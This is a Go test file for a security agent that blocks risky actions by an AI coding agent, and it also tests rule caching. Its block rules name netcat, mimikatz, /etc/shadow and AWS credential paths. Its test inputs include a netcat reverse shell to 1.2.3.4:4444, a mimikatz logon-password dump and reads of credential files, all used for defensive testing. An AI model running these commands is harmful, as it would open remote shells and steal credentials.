package hook

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/correlic/correlic-agent/internal/transport"
)

var testRules = []transport.AgentBlockRule{
	{ID: 1, SignalType: "process_exec", Pattern: "nc"},
	{ID: 2, SignalType: "process_exec", Pattern: "Mimikatz.exe"},
	{ID: 3, SignalType: "file_open", Pattern: "/etc/shadow"},
	{ID: 4, SignalType: "file_open", Pattern: "/home/*/.aws/*"},
	{ID: 5, SignalType: "file_open", Pattern: "/srv/secrets/**"},
	{ID: 6, SignalType: "net_connect", Pattern: "1.2.3.4:4444"},
}

func TestEvaluate_ProcessExec(t *testing.T) {
	cases := []struct {
		command string
		rule    int
		cand    string
	}{
		{"nc -l 4444", 1, "nc"},
		{"cd /tmp && sudo /usr/bin/nc -e /bin/sh 1.2.3.4 4444", 1, "/usr/bin/nc"},
		{"ls | NC", 1, "NC"},
		{`C:\Tools\mimikatz.exe sekurlsa::logonpasswords`, 2, `C:\Tools\mimikatz.exe`},
		{"./MIMIKATZ.EXE", 2, "./MIMIKATZ.EXE"},
		{"./mimikatz", 0, ""}, // a rule written with .exe only matches .exe, like the agent
		{"sudo -u root nc -l 4444", 1, "nc"},
		{"ncat -l 4444", 0, ""}, // exact basename match only, like the agent
		{"echo nc", 0, ""},
		{"npm test", 0, ""},
		{"", 0, ""},
	}
	for _, c := range cases {
		d := Evaluate(&ToolEvent{Command: c.command}, testRules, "/home/u")
		if d.Blocked != (c.rule != 0) || d.RuleID != c.rule || d.Candidate != c.cand {
			t.Errorf("Evaluate(%q) = %+v, want rule %d candidate %q", c.command, d, c.rule, c.cand)
		}
		if d.Blocked && d.SignalType != "process_exec" {
			t.Errorf("Evaluate(%q) signal = %s", c.command, d.SignalType)
		}
	}
}

func TestEvaluate_FileOpen(t *testing.T) {
	cases := []struct {
		ev   ToolEvent
		rule int
	}{
		{ToolEvent{FilePath: "/etc/shadow"}, 3},
		{ToolEvent{FilePath: "/ETC/SHADOW"}, 3},
		{ToolEvent{FilePath: "/home/alice/.aws/credentials"}, 4},
		{ToolEvent{FilePath: "/srv/secrets/db/password.txt"}, 5},
		{ToolEvent{FilePath: "/home/alice/project/main.go"}, 0},
		{ToolEvent{Command: "cat /etc/shadow"}, 3},
		{ToolEvent{Command: "cat ~/.aws/credentials"}, 4}, // ~ expands to /home/u; /home/*/.aws/* matches
		{ToolEvent{Command: "cat ~/notes.txt"}, 0},
		{ToolEvent{Command: "curl http://1.2.3.4:4444/"}, 0}, // net_connect rules do not apply
	}
	for _, c := range cases {
		d := Evaluate(&c.ev, testRules, "/home/u")
		if d.Blocked != (c.rule != 0) || d.RuleID != c.rule {
			t.Errorf("Evaluate(%+v) = %+v, want rule %d", c.ev, d, c.rule)
		}
		if d.Blocked && d.SignalType != "file_open" {
			t.Errorf("signal = %s", d.SignalType)
		}
	}
	if d := Evaluate(nil, testRules, ""); d.Blocked {
		t.Error("nil event must not block")
	}
	if d := Evaluate(&ToolEvent{Command: "nc"}, nil, ""); d.Blocked {
		t.Error("no rules must not block")
	}
	r := Decision{Blocked: true, RuleID: 3, SignalType: "file_open", Candidate: "/etc/shadow", Pattern: "/etc/shadow"}.Reason()
	if r != `Correlic block rule #3 (file_open "/etc/shadow") denied this file access: /etc/shadow` {
		t.Errorf("reason = %q", r)
	}
}

// fakeRules is a RuleSource recording calls.
type fakeRules struct {
	calls   int
	etags   []string
	res     *transport.BlockRulesResult
	err     error
	onEtag  func(etag string) (*transport.BlockRulesResult, error)
	version string
}

func (f *fakeRules) GetBlockRules(_ context.Context, etag string) (*transport.BlockRulesResult, error) {
	f.calls++
	f.etags = append(f.etags, etag)
	if f.onEtag != nil {
		return f.onEtag(etag)
	}
	return f.res, f.err
}

func discardLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

func TestLoadRules_CacheLifecycle(t *testing.T) {
	dir := t.TempDir()
	now := time.Date(2026, 10, 8, 12, 0, 0, 0, time.UTC)
	src := &fakeRules{res: &transport.BlockRulesResult{Version: "v1", Rules: testRules[:2]}}

	rules, ok := LoadRules(context.Background(), src, dir, now, discardLogger())
	if !ok || len(rules) != 2 || src.calls != 1 || src.etags[0] != "" {
		t.Fatalf("first load: ok=%v rules=%d calls=%d etags=%v", ok, len(rules), src.calls, src.etags)
	}
	if _, err := os.Stat(filepath.Join(dir, RuleCacheFile)); err != nil {
		t.Fatalf("cache not written: %v", err)
	}

	// Within the TTL: no fetch.
	rules, ok = LoadRules(context.Background(), src, dir, now.Add(30*time.Second), discardLogger())
	if !ok || len(rules) != 2 || src.calls != 1 {
		t.Fatalf("cached load: ok=%v rules=%d calls=%d", ok, len(rules), src.calls)
	}

	// After the TTL: conditional fetch, 304 refreshes the timestamp.
	src.onEtag = func(etag string) (*transport.BlockRulesResult, error) {
		if etag == "v1" {
			return &transport.BlockRulesResult{Version: "v1", NotModified: true}, nil
		}
		return &transport.BlockRulesResult{Version: "v2", Rules: testRules}, nil
	}
	rules, ok = LoadRules(context.Background(), src, dir, now.Add(2*time.Minute), discardLogger())
	if !ok || len(rules) != 2 || src.calls != 2 || src.etags[1] != "v1" {
		t.Fatalf("304 load: ok=%v rules=%d calls=%d etags=%v", ok, len(rules), src.calls, src.etags)
	}
	rules, ok = LoadRules(context.Background(), src, dir, now.Add(2*time.Minute+30*time.Second), discardLogger())
	if !ok || src.calls != 2 {
		t.Fatalf("304 must refresh fetched_at: calls=%d", src.calls)
	}

	// Rules changed on the backend.
	src.onEtag = func(string) (*transport.BlockRulesResult, error) {
		return &transport.BlockRulesResult{Version: "v2", Rules: testRules}, nil
	}
	rules, ok = LoadRules(context.Background(), src, dir, now.Add(4*time.Minute), discardLogger())
	if !ok || len(rules) != len(testRules) {
		t.Fatalf("v2 load: ok=%v rules=%d", ok, len(rules))
	}

	// Backend down: stale cache is used.
	src.onEtag = func(string) (*transport.BlockRulesResult, error) { return nil, errors.New("dial tcp: refused") }
	rules, ok = LoadRules(context.Background(), src, dir, now.Add(10*time.Minute), discardLogger())
	if !ok || len(rules) != len(testRules) {
		t.Fatalf("stale load: ok=%v rules=%d", ok, len(rules))
	}

	// Auth rejected with no cache at all: allow (ok=false).
	empty := t.TempDir()
	src.onEtag = func(string) (*transport.BlockRulesResult, error) {
		return nil, &transport.BackendError{Status: http.StatusUnauthorized}
	}
	if _, ok := LoadRules(context.Background(), src, empty, now, discardLogger()); ok {
		t.Error("no cache + auth error must yield ok=false")
	}
}

func TestLoadRules_CorruptCacheIsIgnored(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, RuleCacheFile), []byte("{not json"), 0o600)
	src := &fakeRules{res: &transport.BlockRulesResult{Version: "v1", Rules: testRules}}
	rules, ok := LoadRules(context.Background(), src, dir, time.Now(), discardLogger())
	if !ok || len(rules) != len(testRules) || src.etags[0] != "" {
		t.Fatalf("ok=%v rules=%d etags=%v", ok, len(rules), src.etags)
	}
	raw, _ := os.ReadFile(filepath.Join(dir, RuleCacheFile))
	var c ruleCache
	if json.Unmarshal(raw, &c) != nil || c.Version != "v1" {
		t.Errorf("cache not rewritten: %s", raw)
	}
}
